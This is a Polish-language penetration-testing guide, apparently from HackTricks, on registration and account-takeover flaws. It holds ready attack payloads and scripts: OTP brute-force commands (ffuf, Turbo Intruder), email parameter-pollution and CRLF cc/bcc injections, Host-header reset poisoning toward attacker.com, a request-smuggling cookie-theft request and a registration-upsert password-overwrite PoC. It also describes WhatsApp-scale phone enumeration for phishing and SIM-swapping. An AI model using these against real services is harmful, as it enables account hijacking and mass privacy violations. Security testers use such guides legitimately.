# Luki w rejestracji i przejęciu kont

{{#include ../banners/hacktricks-training.md}}

## Przejęcie przez rejestrację

### Duplikowana rejestracja

- Spróbuj utworzyć konto używając istniejącej nazwy użytkownika
- Sprawdź różne warianty adresu e-mail:
- uppercase
- +1@
- dodaj kropkę w adresie e-mail
- znaki specjalne w nazwie adresu e-mail (%00, %09, %20)
- Dodaj znaki odstępu po adresie e-mail: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Wypróbuj sztuczki kanonikalizacji dostawcy e-mail (zależne od usługi):
- Gmail ignores dots and subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Niektórzy dostawcy nie rozróżniają wielkości liter w części lokalnej adresu
- Niektórzy dostawcy akceptują unicode confusables. Spróbuj homoglyphs i soft hyphen `\u00AD` w części lokalnej
- Wykorzystaj to, aby: obejść sprawdzenia unikalności, uzyskać duplikaty kont/zaproszeń do workspace, lub zablokować rejestracje ofiary (tymczasowy DoS) podczas przygotowań do przejęcia

### Enumeracja nazw użytkowników

Sprawdź, czy możesz rozpoznać, kiedy nazwa użytkownika jest już zarejestrowana w aplikacji.

- Różne komunikaty o błędach lub kody statusu HTTP
- Różnice w czasie odpowiedzi (istniejący użytkownik może wywołać zapytanie do IdP/DB)
- Autouzupełnianie formularza rejestracji danymi profilu dla znanych adresów e-mail
- Sprawdź przepływy team/invite: wpisanie adresu e-mail może ujawnić, czy konto istnieje

### Polityka haseł

Podczas tworzenia użytkownika sprawdź politykę haseł (czy można użyć słabych haseł).\
W takim przypadku możesz spróbować przeprowadzić brute-force na poświadczeniach.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers

{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities

{{#ref}}
saml-attacks/
{{#endref}}

### Zmiana e-maila

Po zarejestrowaniu spróbuj zmienić adres e-mail i sprawdź, czy ta zmiana jest poprawnie weryfikowana lub czy można zmienić go na dowolny adres.

### Dodatkowe sprawdzenia

- Sprawdź, czy można użyć **disposable emails** (mailinator, yopmail, 1secmail, etc.) lub obejść blocklistę za pomocą subadresowania jak `victim+mailinator@gmail.com`
- **Długie** **hasło** (>200) prowadzi do **DoS**
- **Sprawdź limity tworzenia kont**
- Użyj username@**burp_collab**.net i analizuj **callback**
- Jeśli używana jest weryfikacja numeru telefonu, sprawdź przypadki brzegowe parsowania/iniekcji numeru telefonu

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Komunikatory oparte na numerach telefonów ujawniają a **presence oracle** zawsze, gdy klient synchronizuje kontakty. Odtwarzanie żądań discovery WhatsAppa historycznie dawało **>100M zapytań na godzinę**, umożliwiając niemal pełną enumerację kont.

**Przebieg ataku**

1. **Zainstrumentuj oficjalnego klienta** aby przechwycić żądanie przesyłania książki adresowej (uwierzytelniony blob z znormalizowanymi numerami E.164). Odtwórz je z numerami wygenerowanymi przez atakującego, ponownie używając tych samych cookies/tokenu urządzenia.
2. **Grupuj numery na żądanie**: WhatsApp akceptuje tysiące identyfikatorów i zwraca zarejestrowane/niezarejestrowane plus metadata (business, companion, etc.). Analizuj odpowiedzi offline, aby zbudować listy celów bez wysyłania wiadomości do ofiar.
3. **Skaluj horyzontalnie** enumerację używając SIM banków, cloud devices, lub residential proxies, tak aby ograniczenia per-account/IP/ASN nigdy się nie uruchomiły.

**Modelowanie planu numeracji**

Modeluj plan numeracji każdego kraju, aby pominąć nieprawidłowe kandydatury. Zestaw danych NDSS (`country-table.*`) zawiera kody krajów, gęstość adopcji i podział platform, dzięki czemu możesz priorytetyzować zakresy o wysokim trafieniu. Przykładowy kod seedujący:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Priorytetyzuj prefiksy, które pasują do rzeczywistych przydziałów (Mobile Country Code + National Destination Code) przed zapytaniem oracle, aby zachować użyteczny przepływ.

**Przekształcanie enumeracji w ukierunkowane ataki**

- Wprowadź leaked phone numbers (np. Facebook’s 2021 breach) do oracle, aby ustalić, które tożsamości są nadal aktywne przed phishing, SIM-swapping lub spamming.
- Podziel spisy według kraju/OS/typu aplikacji, aby znaleźć regiony o słabym SMS filtering lub dużej adopcji WhatsApp Business, przydatne do zlokalizowanego social engineering.

**Korelacja ponownego użycia klucza publicznego**

WhatsApp ujawnia klucz tożsamości X25519 każdego konta podczas inicjalizacji sesji. Żądaj materiału tożsamości dla każdego enumerowanego numeru i deduplikuj klucze publiczne, aby ujawnić account farms, sklonowane klienty lub niepewne firmware — współdzielone klucze deanonymize multi-SIM operations.

## Słaba weryfikacja E-mail/Telefon (OTP/Magic Link)

Procesy rejestracji często potwierdzają własność za pomocą numerycznego OTP lub tokenu magic-link. Typowe błędy:

- Przewidywalny lub krótki OTP (4–6 cyfr) bez skutecznego rate limiting lub śledzenia IP/urządzenia. Spróbuj równoległych zgadywań oraz rotacji header/IP.
- Ponowne użycie OTP w różnych akcjach lub kontach, albo brak powiązania z konkretnym użytkownikiem/akcją (np. ten sam kod działa przy logowaniu i rejestracji, albo działa po zmianie e-maila).
- Multi-value smuggling: niektóre backendy akceptują wiele kodów i sprawdzają, czy któryś pasuje. Spróbuj:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: rozróżniaj kody niepoprawne, wygasłe i należące do innego użytkownika po statusie/komunikacie/długości treści.
- Tokeny nieunieważniane po sukcesie lub po zmianie hasła/e-maila.
- Token weryfikacyjny niepowiązany z user agent/IP, co pozwala na cross-origin completion ze stron kontrolowanych przez atakującego.

Przykład bruteforcowania z ffuf przeciwko JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Równoległe/konkurencyjne zgadywanie, aby obejść sekwencyjne blokady (użyj Turbo Intruder w Burp):

<details>
<summary>Turbo Intruder snippet do zmasowanego wysyłania prób 6‑cyfrowych OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Spróbuj racing verification: wyślij ten sam prawidłowy OTP jednocześnie w dwóch sesjach; czasami jedna sesja staje się zweryfikowanym kontem atakującego, podczas gdy przepływ ofiary też kończy się sukcesem.
- Przetestuj również Host header poisoning na linkach weryfikacyjnych (tak jak reset poisoning poniżej), by spowodować leak lub ukończyć weryfikację na hoście kontrolowanym przez atakującego.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Potężna klasa problemów pojawia się, gdy atakujący wykonuje akcje na skrzynce ofiary zanim ta utworzy konto, a następnie odzyskuje dostęp później.

Kluczowe techniki do przetestowania (dostosuj do flow celu):

- Classic–Federated Merge
  - Atakujący: rejestruje klasyczne konto z emailem ofiary i ustawia hasło
  - Ofiara: później rejestruje się przez SSO (ten sam email)
  - Nieprawidłowe merges mogą pozostawić obie strony zalogowane lub przywrócić dostęp atakującego
- Unexpired Session Identifier
  - Atakujący: tworzy konto i utrzymuje długotrwale ważną sesję (nie wylogowuje się)
  - Ofiara: odzyskuje/ustawia hasło i używa konta
  - Przetestuj, czy stare sesje pozostają ważne po resecie lub włączeniu MFA
- Trojan Identifier
  - Atakujący: dodaje dodatkowy identyfikator do uprzednio utworzonego konta (telefon, dodatkowy email lub podłącza własne IdP)
  - Ofiara: resetuje hasło; atakujący później używa trojana do resetu/logowania
- Unexpired Email Change
  - Atakujący: inicjuje zmianę emaila na email atakującego i wstrzymuje potwierdzenie
  - Ofiara: odzyskuje konto i zaczyna z niego korzystać
  - Atakujący: później finalizuje oczekującą zmianę emaila, by ukraść konto
- Non‑Verifying IdP
  - Atakujący: używa IdP, który nie weryfikuje własności emaila, by przypisać `victim@…`
  - Ofiara: rejestruje się klasycznie
  - Serwis łączy konta po emailu bez sprawdzenia `email_verified` lub przeprowadzenia lokalnej weryfikacji

Praktyczne wskazówki

- Pozyskuj flowy i endpointy z paczek web/mobile. Szukaj klasycznej rejestracji, SSO linking, zmiany email/telefonu i endpointów resetu hasła.
- Stwórz realistyczną automatyzację, by utrzymywać sesje przy życiu podczas testowania pozostałych flowów.
- Dla testów SSO uruchom testowy OIDC provider i wydawaj tokeny z roszczeniami `email` dla adresu ofiary oraz `email_verified=false`, by sprawdzić, czy RP ufa niezweryfikowanym IdP.
- Po każdym password reset lub zmianie emaila upewnij się, że:
  - wszystkie inne sesje i tokeny zostały unieważnione,
  - oczekujące możliwości zmiany email/telefonu zostały anulowane,
  - wcześniej powiązane IdP/email/telefony zostały ponownie zweryfikowane.

Uwaga: Obszerna metodologia i studia przypadków tych technik są opisane w Microsoft’s pre‑hijacking research (patrz References na końcu).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Token resetu hasła — Leak via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Zażądaj password reset na swój adres email
2. Kliknij w link resetu hasła
3. Nie zmieniaj hasła
4. Kliknij dowolne strony 3rd party (np. Facebook, twitter)
5. Przechwyć żądanie w Burp Suite proxy
6. Sprawdź, czy nagłówek referer powoduje leak tokena resetu hasła.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Przechwyć żądanie resetu hasła w Burp Suite
2. Dodaj lub edytuj następujące nagłówki w Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Prześlij żądanie ze zmodyfikowanym nagłówkiem\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Szukaj URL resetu hasła opartego na _host header_ jak: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR w parametrach API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Atakujący musi zalogować się na swoje konto i przejść do funkcji **Zmień hasło**.
2. Uruchom Burp Suite i przechwyć żądanie
3. Wyślij je do zakładki repeater i edytuj parametry : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Słaby token resetu hasła <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token resetu hasła powinien być generowany losowo i być za każdym razem unikatowy.\
Spróbuj określić, czy token wygasa czy jest zawsze taki sam — w niektórych przypadkach algorytm generowania jest słaby i można go odgadnąć. Poniższe zmienne mogą być użyte przez algorytm.

- Znacznik czasu
- UserID
- Email użytkownika
- Imię i nazwisko
- Data urodzenia
- Kryptografia
- Tylko liczby
- Krótka sekwencja tokenu ( znaki z zakresu \[A-Z,a-z,0-9])
- Ponowne użycie tokenu
- Data wygaśnięcia tokenu

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Wywołaj żądanie resetu hasła za pomocą API/UI dla konkretnego adresu e-mail, np.: test@mail.com
2. Zbadaj odpowiedź serwera i sprawdź obecność `resetToken`
3. Następnie użyj tokenu w URL-u takim jak `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Reset hasła przez kolizję nazwy użytkownika <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Zarejestruj się w systemie z nazwą użytkownika identyczną z nazwą ofiary, ale z wstawionymi spacjami przed i/lub po nazwie, np.: `"admin "`
2. Poproś o reset hasła dla twojej złośliwej nazwy użytkownika.
3. Użyj tokenu wysłanego na Twój e-mail i zresetuj hasło ofiary.
4. Zaloguj się na konto ofiary używając nowego hasła.

Platforma CTFd była podatna na ten atak.\
Zobacz: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Przejęcie konta przez Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Znajdź XSS w aplikacji lub na subdomenie, jeśli cookies są zakresowane do domeny nadrzędnej : `*.domain.com`
2. Leak bieżące **sessions cookie**
3. Uwierzytelnij się jako użytkownik, używając cookie

### Przejęcie konta przez HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Użyj **smuggler** aby wykryć typ HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Utwórz żądanie, które nadpisze `POST / HTTP/1.1` następującymi danymi:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` z celem wywołania open redirectu ofiar do burpcollab i kradzieży ich cookies\
3. Końcowe żądanie może wyglądać następująco
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone zgłasza wykorzystanie tego buga\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Przejęcie konta przez CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Stwórz payload dla CSRF, np.: “HTML form with auto submit for a password change”
2. Wyślij payload

### Przejęcie konta przez JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token może być używany do uwierzytelniania użytkownika.

- Edytuj JWT, podstawiając inny User ID / Email
- Sprawdź, czy sygnatura JWT jest słaba


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Rejestracja jako reset (Upsert on Existing Email)

Niektóre mechanizmy rejestracji wykonują upsert, gdy podany email już istnieje. Jeśli endpoint akceptuje minimalne body zawierające email i password i nie wymusza weryfikacji własności, wysłanie emaila ofiary nadpisze jej password przed autoryzacją (pre-auth).

- Discovery: harvest endpoint names from bundled JS (or mobile app traffic), then fuzz base paths like /parents/application/v4/admin/FUZZ using ffuf/dirsearch.
- Method hints: a GET returning messages like "Only POST request is allowed." often indicates the correct verb and that a JSON body is expected.
- Minimalne body zaobserwowane w praktyce:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Przykład PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Wpływ: Full Account Takeover (ATO) bez żadnego reset token, OTP ani email verification.

## Źródła

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
